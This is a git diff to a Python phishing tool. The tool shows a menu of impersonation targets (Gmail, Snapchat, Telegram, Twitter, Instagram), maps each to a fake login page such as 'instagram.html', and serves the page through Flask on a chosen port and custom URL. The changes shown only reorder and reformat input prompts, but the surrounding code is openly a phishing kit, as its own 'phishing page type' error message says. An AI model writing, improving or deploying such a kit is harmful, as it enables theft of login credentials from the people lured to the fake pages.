@@ -82,7 +82,9 @@ print(f"{purple}--> gmail → Gmail")
 print(f"{green}--> snap → Snapchat")
 print(f"{purple}--> tele → Telegram")
 print(f"{green}--> x → Twitter")
-print(f"{red}                   More Features Are Comming Soon!")
+print(f"\n{red}More Features Are Comming Soon!\n")
+
+chhosse = input((f"{green}Enter here {byellow}(insta, meta, etc.): ")).lower()
 
 try:
     por = int(input(termcolor.colored("Enter port number here (Default port - 8096): ", "cyan")))
@@ -93,7 +95,6 @@ try:
 except:
     por = 8096
 
-chhosse = input(termcolor.colored("Enter: ", "green")).lower()
 
 optiosn = {
         "insta": "instagram.html",
@@ -113,7 +114,7 @@ else:
     print(termcolor.colored("Invalid input! Please choose a valid phishing page type.", "red"))
     exit()
 
-custom_url = input(f"{purple}Enter Custom Url: ")
+custom_url = input(f"\n{purple}Enter Custom Url: ")
 
 
 @app.route("/")
